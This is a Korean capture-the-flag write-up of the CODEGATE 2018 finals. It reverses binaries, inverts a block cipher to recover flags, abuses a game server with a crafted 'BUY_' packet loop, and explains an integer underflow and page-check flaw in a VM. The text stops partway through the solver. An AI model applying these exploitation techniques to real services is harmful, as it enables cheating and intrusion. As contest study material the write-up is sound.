# CODEGATE2018 본선 Write-up

정현식



## 0. 서론

이번 한 달 동안 CODEGATE2018 대비로 많은 시간을 사용했는데 결국 좋은 성적을 거두지 못해서 아쉬웠습니다. CODEGATE의 경우, Reversing을 위주로 대비해서 나가서 Reversing 4개와 Pwn 1개를 풀었습니다.



## 1. Shall We Dance

윈도우 PE binary가 주어졌습니다. 살펴보면 노래를 네 곡 골라서 재생할 수 있는 간단한 콘솔 프로그램인데, Tango만 재생이 불가능한 것을 확인할 수 있습니다.

Resource를 불러와서 플레이한다는 것을 확인한 후, Resource를 로드하는 부분을 찾아보았습니다.

```c
int sub_401000()
{
  sub_4084D0(105, &dword_437DC8);
  sub_4084D0(107, &dword_437DCC);
  sub_4084D0(108, &dword_437DD0);
  sub_4084D0(109, &dword_437DD4);
  return sub_40B335(sub_426810);
}
```

105, 107, 108, 109에 각각 Resource를 불러오는 모습입니다. `sub_4084D0`을 살펴봅시다.

```c
int __stdcall sub_4084D0(unsigned __int16 a1, int *a2)
{
  __m128i *v2; // edi@1
  HRSRC v3; // esi@1
  LPVOID v4; // esi@1
  _BYTE *v5; // ebx@1
  unsigned __int32 v6; // edx@1
  unsigned __int32 v7; // ecx@1
  char v8; // cl@2
  int v9; // eax@2
  unsigned __int32 v10; // eax@3
  int v11; // eax@5

  v2 = (__m128i *)sub_40B051(8);
  _mm_storel_epi64(v2, 0i64);
  v3 = FindResourceA(0, (LPCSTR)a1, "WAVE");
  v2->m128i_i32[0] = (__int32)LoadResource(0, v3);
  v2->m128i_i32[1] = SizeofResource(0, v3);
  v4 = LockResource((HGLOBAL)v2->m128i_i32[0]);
  v5 = (_BYTE *)sub_4143F0((v2->m128i_i32[1] + 1) | -__CFADD__(v2->m128i_i32[1], 1));
  sub_40CB20(v5, v4, v2->m128i_i32[1] + 1);
  v6 = 0;
  v5[v2->m128i_i32[1]] = 0;
  v7 = v2->m128i_i32[1];
  if ( v7 & 0xFFFFFFFE ) // 1번
  {
    do
    {
      v8 = v5[v6];
      v5[v6] = v5[v2->m128i_i32[1] - v6 - 1];
      v9 = v2->m128i_i32[1] - v6++;
      v5[v9 - 1] = v8;
      v7 = v2->m128i_i32[1];
    }
    while ( v6 < (unsigned __int32)v2->m128i_i32[1] >> 1 );
  }
  v10 = 0;
  if ( v7 ) // 2번
  {
    do
    {
      v5[v10] = (v5[v10] - v10) ^ 0xAD;
      ++v10;
      v7 = v2->m128i_i32[1];
    }
    while ( v10 < v7 );
  }
  v11 = sub_4143F0((v7 + 1) | -__CFADD__(v7, 1));
  *a2 = v11;
  sub_40CB20(v11, v5, v2->m128i_i32[1]);
  FreeResource((HGLOBAL)v2->m128i_i32[0]);
  return sub_4141AD(v5);
}
```

살펴보면 v2->m128i_i32[1]에 length가, v5에 resource가 들어가 있으며 이를 **복호화** 하는 과정이 들어가 있습니다. 간단하게 보면 해당 resource 배열을 반전한 뒤(1번), 2번의 로직을 따라서 들어가게 됩니다.

Resource Hacker를 통해서 resource를 얻어낸 뒤, 해당 과정을 그대로 거쳐 Tango wav file을 얻어낼 수 있었습니다.

```python
filename = '4.bin'

with open(filename, 'rb') as f:
    data = f.read()

data = list(data)
data.reverse()

for i in range( len(data) ):
    data[i] -= i
    data[i] %= 0x100
    data[i] ^= 0xAD

with open('4.wav', 'wb') as f:
    f.write( bytes(data) )
```

이를 실행해보면, wav 파일 자체에 문제가 있어 실행이 안 된다는 것을 확인할 수 있습니다. 헤더를 살펴보면 기존 헤더와 모양새가 다릅니다.

```
52 49 46 46 2C 8F 10 00 57 41 56 45 66 6D 74 20
12 00 00 00 01 00 01 00 C0 5D 00 00 00 00 00 00
02 00 10 00 00 00 64 61 74 61 82 84 10 00 00 00
```

wav 파일의 구조상 Format Chunk Marker의 size를 나타내는 2번째 줄의 `12 00 00 00`은 보통의 경우 `10 00 00 00`입니다. 그리고 2번째 줄 맨 마지막의 `00 00 00 00`은 원래 Sample Rate의 값이 들어가 있어야 하는데 0이라는 것을 알 수 있고, 3번째 줄의 `02 00`와 `01 00` 이후로 별도의 값이 나올 것이 없는데 불필요하게 `00 00`이 들어가 있음을 알 수 있습니다. Sample Rate를 재계산해서 넣어주고, `00 00`을 제거해서 다음과 같이 헤더를 바꿔줍니다.

```
52 49 46 46 2C 8F 10 00 57 41 56 45 66 6D 74 20
10 00 00 00 01 00 01 00 C0 5D 00 00 80 BB 00 00 
02 00 10 00 64 61 74 61 82 84 10 00 00 00 00 00
```

이제 정상적으로 wav 파일을 들을 수 있고, 답을 친절하게 알파벳을 한글자씩 읽어줍니다. `myfavoritemusicisjazz`가 문제의 답입니다.



##2. cathttpd 1

로직의 분석은 같은 팀원이 사실상 끝냈고, 복호화 루틴만이 남아있는 상태였습니다.

```
[Auth]
ID = Adm1nistr@t0r
PW = 560a5713b657094b6930f2977706a4366747c6bdec425d5b3dc77f32bbc66602a83d42d66cf5a049b0b65f8b76d329e8bbaf55fb910011db

; Good Work :slightly_smiling_face:
; plain text of PW is Part-1 FLAG.
; W_W
; Go Deep~
```

`560a5713b657094b6930f2977706a4366747c6bdec425d5b3dc77f32bbc66602a83d42d66cf5a049b0b65f8b76d329e8bbaf55fb910011db` 를 복호화하면 되는데, 암호화 루틴이 꽤나 복잡합니다.

```c
__int64 __fastcall sub_5D8B(char *a1, char *a2)
{
  ...
  dest = (char *)&v11;
  v5 = strlen(s);
  strncpy(dest, s, v5 + 1);
  v26 = 7237377322690830659LL;
  v27 = 7237412644501860931LL;
  v25 = 7023739967326218356LL;
  ...
  v23 = (__int64 *)&v11;
  i = 0;
  sub_67E6((__int64)&v11, (__int64)dest, v3, (__int64)&v25, (__int64)&v26);
  v8 = alloca(16 * ((2 * v6 + 31) / 0x10uLL));
  s1 = (char *)(16 * ((unsigned __int64)((char *)&v12 + 7) >> 4));
  memset((void *)(16 * ((unsigned __int64)((char *)&v12 + 7) >> 4)), 0, 2 * v6 + 1);
  for ( i = 0; i < (unsigned __int64)v6; ++i )
    snprintf(&s1[2 * i], 4uLL, "%02x", *((_BYTE *)v23 + i));
  result = strcmp(s1, s2) == 0;
  v10 = *MK_FP(__FS__, 40LL) ^ v28;
  return result;
}
```

암호화 루틴의 첫 시작입니다.  불필요한 부분은 제거했습니다. 중요한 것은 `sub67E6`을 거쳐서 `dest`에 나온 값을 snprintf를 통해 `s1`에 출력하고 이것이 `s2(=a2)`와 같은지 체크한다는 것입니다. `sub_67E6`을 살펴봅시다.

v27은 v26 바로 다음의 메모리 위치에 작성되어 있다는 점을 참고하고 `sub_67E6`을 읽으면 됩니다.

```c
__int64 __fastcall sub_67E6(__int64 a1, __int64 a2, unsigned __int64 a3, __int64 a4, __int64 a5)
{
  ...
  v14 = a1;
  v13 = a2;
  v12 = a3;
  v5 = a4;
  v6 = a5;
  v25 = *MK_FP(__FS__, 40LL);
  v15 = 0;
  v17 = sub_6702(a4); // sub_5D8B의 v25
  v18 = sub_6702(v5 + 4);
  v19 = sub_6702(v6); // sub_5D8B의 v26
  v20 = sub_6702(v6 + 4);
  v21 = sub_6702(v6 + 8); // sub_5D8B의 v27
  v22 = sub_6702(v6 + 12);
  while ( v12 > 7 ) // 암호화 루틴
  {
    v7 = sub_6702(v13);
    v17 ^= v7;
    v8 = sub_6702(v13 + 4);
    v18 ^= v8;
    sub_65F2((__int64)&v17, (__int64)&v19);
    sub_6776(v14, v17);
    sub_6776(v14 + 4, v18);
    v13 += 8LL;
    v14 += 8LL;
    v12 -= 8LL;
  }
  while ( v15 < v12 ) // 만약 8byte 단위로 안 끊긴다면, padding을 삽입
  {
    v23[v15] = *(_BYTE *)(v15 + v13);
    ++v15;
  }
  for ( i = v12; i <= 7; ++i )
    v23[i] = 8 - v12;
  v9 = sub_6702((__int64)v23); // 마지막 block 암호화
  v17 ^= v9;
  v10 = sub_6702((__int64)v24);
  v18 ^= v10;
  sub_65F2((__int64)&v17, (__int64)&v19);
  sub_6776(v14, v17);
  sub_6776(v14 + 4, v18);
  return *MK_FP(__FS__, 40LL) ^ v25;
}
```

주석을 붙여 조금 읽을 수 있게 수정했습니다. 해당 암호화 루틴은 **Block Cipher**의 대표적인 예시입니다.  `v19 ~ v22`는 암호화 루틴에 사용되는 상수 값입니다. 그리고 `v17, v18`은 IV 값 2개를 의미하고, 이 값은 `sub_6702`를 거친 input과 XOR된 뒤 `sub_65F2`, `sub_6776`을 거쳐 암호화되어 나오게 됩니다. 그리고 이 값은 다시 `v17, v18`로서 암호화 루틴에 반복되어서 쓰이는 것을 볼 수 있습니다.

그러면 `sub_65F2`, `sub_6702`, `sub_6776`을 살펴봅시다.

```c
__int64 __fastcall sub_6702(__int64 a1)
{
  __int64 result; // rax@1
  __int64 v2; // rcx@1

  result = (*(_BYTE *)(a1 + 2) << 16) | *(_BYTE *)a1 | (*(_BYTE *)(a1 + 1) << 8) | ((unsigned int)*(_BYTE *)(a1 + 3) << 24);
  v2 = *MK_FP(__FS__, 40LL) ^ *MK_FP(__FS__, 40LL);
  return result;
}

__int64 __fastcall sub_6776(__int64 a1, unsigned int a2)
{
  __int64 v2; // ST18_8@1

  v2 = *MK_FP(__FS__, 40LL);
  *(_BYTE *)a1 = a2;
  *(_BYTE *)(a1 + 1) = BYTE1(a2);
  *(_BYTE *)(a1 + 2) = a2 >> 16;
  *(_BYTE *)(a1 + 3) = BYTE3(a2);
  return *MK_FP(__FS__, 40LL) ^ v2;
}
```

읽어보면 쉽게 알 수 있습니다. 입력 받은 값과 똑같은 값을 다시 반환합니다.

```c
__int64 __fastcall sub_65F2(__int64 a1, __int64 a2)
{
  int v3; // [sp+1Ch] [bp-14h]@1
  unsigned int i; // [sp+20h] [bp-10h]@1
  __int64 v5; // [sp+28h] [bp-8h]@1

  v5 = *MK_FP(__FS__, 40LL);
  v3 = 0;
  for ( i = 0; i <= 0x1F; ++i )
  {
    v3 -= 1640531527;
    *(_DWORD *)a1 += (*(_DWORD *)(a1 + 4) + v3) ^ (16 * *(_DWORD *)(a1 + 4) + *(_DWORD *)a2) ^ ((*(_DWORD *)(a1 + 4) >> 5)
                                                                                              + *(_DWORD *)(a2 + 4));
    *(_DWORD *)(a1 + 4) += (*(_DWORD *)a1 + v3) ^ (16 * *(_DWORD *)a1 + *(_DWORD *)(a2 + 8)) ^ ((*(_DWORD *)a1 >> 5)
                                                                                              + *(_DWORD *)(a2 + 12));
  }
  return *MK_FP(__FS__, 40LL) ^ v5;
}
```

암호화 로직이 들어가있는데, `a1`에 `a1+4`와 `a2, a2+4`를 통해 얻은 값을 더하고, `a1+4`에 다시 `a1`과 `a2+8, a2+16`을 통해 얻은 값을 더하는 과정을 총 `0x20` 번 반복하는 것을 볼 수 있습니다. 그러므로 이 암호화 루틴은 간단하게 역산을 할 수 있습니다. 다시 `a1+4`에 `a1`과 `a2+8, a2+16`을 통해 얻은 값을 빼내고, 다시 `a1`에 `a1+4`와 `a2, a2+4`를 통해 얻은 값을 빼내면 됩니다. 이를 통해 복호화하는 코드를 작성하면 다음과 같습니다.

```python
iv = [0x73316874, 0x61795649] #v25
key1 = [0x68746143, 0x64705454] #v26
key2 = [0x68743243, 0x64707474] #v27

#560a5713b657094b6930f2977706a4366747c6bdec425d5b3dc77f32bbc66602a83d42d66cf5a049b0b65f8b76d329e8bbaf55fb910011db
outputs = [ [0x13570a56, 0x4b0957b6],
            [0x97f23069, 0x36a40677],
            [0xbdc64767, 0x5b5d42ec],
            [0x327fc73d, 0x0266c6bb],
            [0xd6423da8, 0x49a0f56c],
            [0x8b5fb6b0, 0xe829d376],
            [0xfb55afbb, 0xdb110091] ] 

def subblock(p, q, key, stage):
    v3 = (-1640531527) * (stage+1)
    v3 %= 0x100000000

    p -= (q + v3) ^ (16 * q + key[0]) ^ ( (q>>5) + key[1])
    p %= 0x100000000

    return p

flag = ""

for i in range(7):
    p, q = outputs[i]
    for j in range(0x20):
        q = subblock(q, p, key2, 0x1F-j)
        p = subblock(p, q, key1, 0x1F-j)

    if i == 0:
        p ^= iv[0]
        q ^= iv[1]
    else:
        p ^= outputs[i-1][0]
        q ^= outputs[i-1][1]

    
    for j in range(4):
        flag += chr(p % 256)
        p = p // 256

    for j in range(4):
        flag += chr(q % 256)
        q = q // 256

print(flag)
```

답은 `FLAG{F1l3_D0wn10ad_Vuln3rability_1s_2lways_D2ng3r0us}` 임을 알 수 있습니다.



##3. Game 1/2

한 바이너리에 두 개의 flag가 들어가 있습니다. 웹 소켓으로 작성된 간단한 게임이고, 클라이언트는 페이지를 통해 들어갈 수 있으며 별도로 server 바이너리를 제공해줍니다.

문제를 열어본 뒤 읽어보면 flag1과 flag2를 쉽게 찾아볼 수 있습니다.

```c++
while ( 1 )
            {
              v24 = (unsigned __int8)sub_40941A(*(_QWORD *)(v197 + 24))
                 && *(_DWORD *)(*(_QWORD *)(v197 + 24) + 76LL) <= 109 ? 1 : 0;
              if ( !v24 )
                break;
              if ( *(_DWORD *)(*(_QWORD *)(v197 + 24) + 76LL) == 100 )
              {
                basic_ifstream<char,char_traits<char>>::basic_ifstream(&v94, "./flag1", 8LL);
                v25 = sub_40B373(0x10u, 8);
                basic_stringstream<char,char_traits<char>,allocator<char>>::basic_stringstream(
                  &v92,
                  v25);
                LODWORD(v26) = basic_ifstream<char,char_traits<char>>::rdbuf(&v94);
                ostream::operator<<(&v93, v26);
                basic_stringstream<char,char_traits<char>,allocator<char>>::str(&v127, &v92);
                allocator<char>::allocator(&v129);
                basic_string<char,char_traits<char>,allocator<char>>::basic_string(
                  &v128,
                  "FLAG",
                  &v129);
                basic_string<char,char_traits<char>,allocator<char>>::basic_string(&v130, &v81);
                sub_409C6C((__int64)&v85, (__int64)&v130, (__int64)&v128, (__int64)&v127);
                basic_string<char,char_traits<char>,allocator<char>>::~basic_string(&v130);
                basic_string<char,char_traits<char>,allocator<char>>::~basic_string(&v128);
                allocator<char>::~allocator(&v129);
                basic_string<char,char_traits<char>,allocator<char>>::~basic_string(&v127);
                sub_409F7A((__int64)&v84, (__int64)&v85);
                LODWORD(v27) = basic_string<char,char_traits<char>,allocator<char>>::size(&v84);
                v28 = v27;
                LODWORD(v29) = basic_string<char,char_traits<char>,allocator<char>>::c_str(&v84);
                uWS::WebSocket<true>::send(a2, v29, v28, 2LL, 0LL, 0LL);
                basic_string<char,char_traits<char>,allocator<char>>::~basic_string(&v84);
                sub_409F40((__int64)&v85);
                basic_stringstream<char,char_traits<char>,allocator<char>>::~basic_stringstream(&v92);
                basic_ifstream<char,char_traits<char>>::~basic_ifstream(&v94);
              }
            }
          }
```

```c++
      v44 = !basic_string<char,char_traits<char>,allocator<char>>::compare(&v82, "KEY_")
         && !basic_string<char,char_traits<char>,allocator<char>>::compare(&v83, "A");
      if ( v44 )
      {
        v150 = sub_4042CC((__int64)&unk_6114C0, (__int64)&v81);
        v194 = *(_QWORD *)(sub_4043B4(&v150) + 32);
        *(_DWORD *)v100 = sub_40863A(
                            *(_QWORD *)(v194 + 16),
                            *(_DWORD *)(*(_QWORD *)(v194 + 24) + 88LL),
                            *(_DWORD *)(*(_QWORD *)(v194 + 24) + 92LL));
        switch ( *(_DWORD *)v100 )
        {
          case 0x1E:
            v193 = sub_40867C(*(_QWORD *)(v194 + 16), 30);
            basic_ostringstream<char,char_traits<char>,allocator<char>>::basic_ostringstream(
              &v94,
              16LL);
            ostream::write((ostream *)&v94, v100, 4LL);
            v45 = strlen(v193);
            ostream::write((ostream *)&v94, v193, v45);
            basic_ostringstream<char,char_traits<char>,allocator<char>>::str(&v151, &v94);
            allocator<char>::allocator(&v153);
            basic_string<char,char_traits<char>,allocator<char>>::basic_string(
              &v152,
              "MSG_",
              &v153);
            basic_string<char,char_traits<char>,allocator<char>>::basic_string(&v154, &v81);
            sub_409C6C((__int64)&v92, (__int64)&v154, (__int64)&v152, (__int64)&v151);
            basic_string<char,char_traits<char>,allocator<char>>::~basic_string(&v154);
            basic_string<char,char_traits<char>,allocator<char>>::~basic_string(&v152);
            allocator<char>::~allocator(&v153);
            basic_string<char,char_traits<char>,allocator<char>>::~basic_string(&v151);
            sub_409F7A((__int64)&v91, (__int64)&v92);
            LODWORD(v46) = basic_string<char,char_traits<char>,allocator<char>>::size(&v91);
            v47 = v46;
            LODWORD(v48) = basic_string<char,char_traits<char>,allocator<char>>::c_str(&v91);
            uWS::WebSocket<true>::send(a2, v48, v47, 2LL, 0LL, 0LL);
            basic_string<char,char_traits<char>,allocator<char>>::~basic_string(&v91);
            sub_409F40((__int64)&v92);
            basic_ostringstream<char,char_traits<char>,allocator<char>>::~basic_ostringstream(&v94);
            break;
          case 0x1F:
            basic_ifstream<char,char_traits<char>>::basic_ifstream(&v94, "./flag2", 8LL);
            v49 = sub_40B373(0x10u, 8);
            basic_stringstream<char,char_traits<char>,allocator<char>>::basic_stringstream(
              &v92,
              v49);
            LODWORD(v50) = basic_ifstream<char,char_traits<char>>::rdbuf(&v94);
            ostream::operator<<(&v93, v50);
            basic_stringstream<char,char_traits<char>,allocator<char>>::str(&v155, &v92);
            allocator<char>::allocator(&v157);
            basic_string<char,char_traits<char>,allocator<char>>::basic_string(
              &v156,
              "FLAG",
              &v157);
            basic_string<char,char_traits<char>,allocator<char>>::basic_string(&v158, &v81);
            sub_409C6C((__int64)&s, (__int64)&v158, (__int64)&v156, (__int64)&v155);
            basic_string<char,char_traits<char>,allocator<char>>::~basic_string(&v158);
            basic_string<char,char_traits<char>,allocator<char>>::~basic_string(&v156);
            allocator<char>::~allocator(&v157);
            basic_string<char,char_traits<char>,allocator<char>>::~basic_string(&v155);
            sub_409F7A((__int64)&v84, (__int64)&s);
            LODWORD(v51) = basic_string<char,char_traits<char>,allocator<char>>::size(&v84);
            v52 = v51;
            LODWORD(v53) = basic_string<char,char_traits<char>,allocator<char>>::c_str(&v84);
            uWS::WebSocket<true>::send(a2, v53, v52, 2LL, 0LL, 0LL);
            basic_stringstream<char,char_traits<char>,allocator<char>>::str(&v160, &v92);
            allocator<char>::allocator(&v162);
            basic_string<char,char_traits<char>,allocator<char>>::basic_string(
              &v161,
              &unk_40B625,
              &v162);
            sub_403D14((__int64)&v159, (__int64)&v161, (__int64)&v160);
            allocator<char>::allocator(&v164);
            basic_string<char,char_traits<char>,allocator<char>>::basic_string(
              &v163,
              "MSG_",
              &v164);
            basic_string<char,char_traits<char>,allocator<char>>::basic_string(&v165, &v81);
            sub_409C6C((__int64)&v91, (__int64)&v165, (__int64)&v163, (__int64)&v159);
            basic_string<char,char_traits<char>,allocator<char>>::~basic_string(&v165);
            basic_string<char,char_traits<char>,allocator<char>>::~basic_string(&v163);
            allocator<char>::~allocator(&v164);
            basic_string<char,char_traits<char>,allocator<char>>::~basic_string(&v159);
            basic_string<char,char_traits<char>,allocator<char>>::~basic_string(&v161);
            allocator<char>::~allocator(&v162);
            basic_string<char,char_traits<char>,allocator<char>>::~basic_string(&v160);
            sub_409F7A((__int64)&v85, (__int64)&v91);
            LODWORD(v54) = basic_string<char,char_traits<char>,allocator<char>>::size(&v85);
            v55 = v54;
            LODWORD(v56) = basic_string<char,char_traits<char>,allocator<char>>::c_str(&v85);
            uWS::WebSocket<true>::send(a2, v56, v55, 2LL, 0LL, 0LL);
            basic_string<char,char_traits<char>,allocator<char>>::~basic_string(&v85);
            sub_409F40((__int64)&v91);
            basic_string<char,char_traits<char>,allocator<char>>::~basic_string(&v84);
            sub_409F40((__int64)&s);
            basic_stringstream<char,char_traits<char>,allocator<char>>::~basic_stringstream(&v92);
            basic_ifstream<char,char_traits<char>>::~basic_ifstream(&v94);
            break;
```

flag2의 경우 맵의 `0x1F` 값을 가진 타일 위에서 A키를 누르면 된다는 것을 알 수 있습니다. 그런데 0x1F 값을 가진 맵의 데이터는 `0x610AE0`으로, 맵의 리스트가 저장된 `0x610BA0`에서 64(0x40)번째 맵 데이터입니다.

맵 데이터는 다음과 같은 형태로 구성되어 있습니다.

```
 [width] [height]
 [map tile data] * (width * height)
 [portal map number] [portal x] [portal y] * (portal num)
```

Portal의 경우 맵 타일에 포탈이 -1, -2와 같은 형식으로 들어가 있습니다. 해당 포탈을 밟게 되면 i번째 포탈의 데이터를 불러들이는데, 읽어들이는 값이 총 3개입니다. 하나는 어느 맵으로 이동할 지, 뒤의 2개는 그 맵의 어느 x, y로 이동할 지입니다.

그런데 어느 맵을 살펴봐도 `0x40`으로 움직이는 포탈은 없습니다. 하지만 게임의 특수 기능 중 Hearthstone이 있는데, 귀환할 지정을 정한 뒤 아이템을 사용하면 귀환하게 됩니다. 여기에서 버그가 하나 발생하는데, Hearthstone을 사용하면 보여주는 **맵의 데이터는 귀환한 맵의 데이터를 사용하지만 포탈의 경우 귀환석을 사용한 맵의 데이터를 사용** 하게 됩니다. 해당 로직까지 풀이에 첨부하면 너무 길어져서 생략합니다.

그렇다면 다음과 같은 행동이 가능해집니다: **만약 포탈이 1개 있는 맵에서 포탈이 10개가 있는 곳으로 귀환을 한 뒤, -10에 해당하는 포탈을 사용하게 된다면?** 당연히 포탈이 1개 있는 맵에는 포탈 데이터가 1개만 들어가 있습니다. 그러므로 2~10번 포탈의 경우 어디로 갈 지 지정이 되어있지 않습니다. 이 경우 메모리에 연속해서 있다는 가정 하에, 그 다음 메모리 영역을 참조해서 움직입니다. 이를 사용하면, `0x1F`번 맵으로 이동이 가능합니다.

```
.data:00000000006103E0 unk_6103E0      db    5                 ; DATA XREF: .data:0000000000610BB0o
.data:00000000006103E1                 db    5
.data:00000000006103E2                 db  45h ; E
.data:00000000006103E3                 db  45h ; E
.data:00000000006103E4                 db  45h ; E
.data:00000000006103E5                 db  45h ; E
.data:00000000006103E6                 db  45h ; E
.data:00000000006103E7                 db  45h ; E
.data:00000000006103E8                 db    1
.data:00000000006103E9                 db    1
.data:00000000006103EA                 db    1
.data:00000000006103EB                 db  45h ; E
.data:00000000006103EC                 db  45h ; E
.data:00000000006103ED                 db    1
.data:00000000006103EE                 db  27h ; '
.data:00000000006103EF                 db    1
.data:00000000006103F0                 db  45h ; E
.data:00000000006103F1                 db  45h ; E
.data:00000000006103F2                 db    1
.data:00000000006103F3                 db    1
.data:00000000006103F4                 db    1
.data:00000000006103F5                 db  45h ; E
.data:00000000006103F6                 db  45h ; E
.data:00000000006103F7                 db  45h ; E
.data:00000000006103F8                 db 0FFh
.data:00000000006103F9                 db  45h ; E
.data:00000000006103FA                 db  45h ; E
.data:00000000006103FB                 db    1                 # PORTAL NO.1
.data:00000000006103FC                 db    9
.data:00000000006103FD                 db    2
.data:00000000006103FE                 db    0
.data:00000000006103FF                 db    0
.data:0000000000610400 unk_610400      db  0Dh                 ; DATA XREF: .data:0000000000610BB8o
.data:0000000000610401                 db  0Dh
.data:0000000000610402                 db  44h ; D
.data:0000000000610403                 db  44h ; D
.data:0000000000610404                 db  44h ; D
.data:0000000000610405                 db  44h ; D
.data:0000000000610406                 db  44h ; D
.data:0000000000610407                 db  38h ; 8
.data:0000000000610408                 db  44h ; D
.data:0000000000610409                 db  44h ; D
.data:000000000061040A                 db  44h ; D
.data:000000000061040B                 db  44h ; D
.data:000000000061040C                 db  44h ; D
.data:000000000061040D                 db  44h ; D
.data:000000000061040E                 db  44h ; D
.data:000000000061040F                 db  44h ; D
.data:0000000000610410                 db  40h ; @
.data:0000000000610411                 db  0Ah
.data:0000000000610412                 db  0Ah
.data:0000000000610413                 db  44h ; D
.data:0000000000610414                 db 0FEh ; 
.data:0000000000610415                 db  44h ; D
.data:0000000000610416                 db  0Ah
.data:0000000000610417                 db  0Ah
.data:0000000000610418                 db  0Ah
.data:0000000000610419                 db  0Ah
.data:000000000061041A                 db  0Ah
.data:000000000061041B                 db  44h ; D
.data:000000000061041C                 db  44h ; D
```

1번 맵(`0x6103E0`)은 상점이 있는 맵으로, 게임에서 유일하게 5x5 짜리 사이즈를 가지고 있는 맵입니다. 포탈 값은 `0x6103FB`에 저장되어있으며, 이 뒤로 값을 **3개**씩 끊으면 7번째(`0x610410`), 즉 8번째 포탈이 있었다면 8번째 포탈의 정보가 들어가 있을 곳에 `0x40`맵의 `0xA, 0xA` 칸으로 이동하라고 지정되어있는 것을 볼 수 있습니다. 그리고 다행히도, 포탈이 10개나 있는 맵(`0x610700`)이 존재합니다. 그러므로 이를 통해 문제를 해결할 수 있습니다.

![image](C:\Users\jhs7jhs\Desktop\image.png)



flag1번의 경우, 제가 풀지 않고 마지막에 돕기만 했습니다. 다음 로직만 읽어보면 됩니다.

```c
v24 = (unsigned __int8)sub_40941A(*(_QWORD *)(v197 + 24))
                 && *(_DWORD *)(*(_QWORD *)(v197 + 24) + 76LL) <= 109 ? 1 : 0;
if ( !v24 )
  break;
if ( *(_DWORD *)(*(_QWORD *)(v197 + 24) + 76LL) == 100 )
  { // FLAG 읽어주는 로직
```

`(v197+24)`는 캐릭터 정보가 담겨있고, `+76`에는 레벨이 저장됩니다. 그리고 `sub_40941A`는 누적 경험치에 따라 레벨을 다시 계산합니다.

그런데 `BUY_\xfc\xff\xff\xff`를 보내면 첫 전투에서 무조건 승리해서 경험치를 얻어온다는 것을 팀원이 발견했습니다. 이를 통해서 경험치를 어떻게든 올려서 레벨을 100으로 만들면 됩니다. 그래서 다음 코드를 무식하게 실행해서, 좌우로 움직이면서 계속 경험치를 쌓도록 했습니다.

```
setInterval(function() {
pressA()
pressA()
pressA()
pressA()
pressA()
PacketHandler.packetSend(id, "BUY_", `\xfc\xff\xff\xff`)
Keyboard._keys[Keyboard.RIGHT] = true
Keyboard._keys[Keyboard.LEFT] = false
}, 300)


setInterval(function() {
pressA()
pressA()
pressA()
pressA()
pressA()
PacketHandler.packetSend(id, "BUY_", `\xfc\xff\xff\xff`)
Keyboard._keys[Keyboard.LEFT] = true
Keyboard._keys[Keyboard.RIGHT] = false
}, 300)
```

이 뒤 레벨 100에 도달하면 flag로 `flag{_cAt_p@y2wIn_c@t_}`를 얻을 수 있습니다.



##4. 7amebox 3

1byte가 7bit이고, 1word가 3byte의 middle-endian으로 구성된 어셈블리의 VM을 제공하는 문제입니다. 코드를 일일이 분석하는 것은 패스하고, 간단하게 취약점만 소개하도록 하겠습니다.

```python
class Stdin:
    def read(self, size):
        res = ''
        buf = sys.stdin.readline(size)
        for ch in buf:
            if ord(ch) > 0b1111111:
                break
            if ch == '\n':
                res += ch
                break
            res += ch
        return res

    def write(self, data):
        return None
```

Read하는 과정에 `0xb1111111`보다 큰 값이 들어오면 바로 string을 자릅니다. `readline`의 특성상 맨 뒤에는 항상 `\n`이 낄 수 밖에 없는데, 덕분에 길이 0의 string을 입력할 수 있습니다.

```python
    def write_memory(self, addr, data, length):
        if not length:
            return

        if self.memory.check_permission(addr, PERM_WRITE) and self.memory.check_permission(addr + length - 1, PERM_WRITE):
            for offset in range(length):
                self.memory[addr + offset] = data[offset] & 0b1111111
        else:
            self.terminate("[VM] Can't write memory")
```

에뮬레이터의 `write_memory`입니다. `write_memory_tri`도 동일한데, A에서 B까지 메모리를 작성하면 A가 포함된 페이지와 B가 포함된 페이지가 writable한지만 체크하고, 그 사이의 페이지에 대해서 체크하지는 않습니다.

```python
    def allocate(self, new_perm, addr=None):
        if addr:
            if not (self.get_perm(addr) & PERM_MAPPED):
                self.set_perm(addr, (PERM_MAPPED | new_perm) & 0b1111)
                return addr
            else:
                return -1

        for page, perm in self.pages.items():
            if not (self.get_perm(page) & PERM_MAPPED):
                self.set_perm(page, (PERM_MAPPED | new_perm) & 0b1111)
                return page
        return -1
```

페이지를 할당받을 때 사용되는 `allocate`입니다. `pages.items()`를 순회하면서 페이지를 꺼내는 것을 볼 수 있는데, Python의 dictionary는 Red-Black Tree와 같이 결정론적 구조를 가지고 있어, dictionary의 구현체가 달라지지 않는 한 pages.items()의 순서는 어느 버전에서 실행해도 순서가 바뀌지 않습니다. 즉, 페이지를 할당받는 순서가 실행할 때마다 바뀌지 않습니다.

마지막으로 대략적인 코드 설명입니다.

노트를 총 10개 작성할 수 있고, 바이너리가 시작될 때 맨 처음 노트의 정보가 담겨있는 페이지를 할당받습니다. 페이지는 4096byte이고, 맨 앞 3byte(1word)에는 지금까지 작성된 노트의 개수, 그 뒤로 3byte씩 할당받은 노트가 작성된 페이지를 가리키는 포인터 값을 가집니다.

각 노트는 페이지를 하나 할당 받은 뒤 해당 페이지에 작성하며, 30byte의 제목, 1200byte의 내용, 30byte의 padding, 1200byte의 비밀키로 이루어집니다.

그런데 노트를 작성하는 함수를 살펴보면 제목과 내용을 입력받는 과정에서 당연히 string의 맨 뒤에 `\n`이 있을 것이라고 가정하고 string의 length를 구한 뒤 length에서 1을 빼고, `\n`이 있는 위치에 NULL을 입력합니다. 그리고 비밀 키의 경우 내용의 길이와 같거나 짧은 string을 입력받습니다.

하지만 앞서 살펴봤듯이 길이가 0인 string을 입력으로 넣을 수 있습니다. 만약 내용에 길이가 0인 string을 입력하게 되면, length는 0이 되고 여기에서 1을 빼면 언더플로우가 발생해 0xffffff가 됩니다. 그리고 비밀키는 이 0xffffff 이하의 길이만큼 입력을 받게 되어, 원하는 길이만큼 메모리에 쓸 수 있습니다. 그리고 위의 `write_memory`에서 살펴봤듯이, 한 페이지를 넘도록 길게 작성한다 하더라도 맨 앞과 맨 뒤를 포함하는 페이지만 writable하면 아무런 에러가 발생하지 않습니다.

그리고 앞서 살펴봤듯이 할당받는 페이지의 주소는 결정론적입니다. 로컬에서 VM을 실행시켜 확인해본 결과, 노트들의 정보를 담는 페이지는 `0x59000`, 노트 1~4번은 `0xc4000`, `0x1c000`, `0x3a000`, `0xdd000` 에 할당됩니다. 또한 stack의 주소는 ASLR이 없어 항상 동일하고, 이 문제에는 기본적인 canary가 구현되어 있습니다.

solver는 다음과 같이 동작합니다.

1. 1번 노트는 flag를 열 때 사용할 'flag' string만 담습니다.
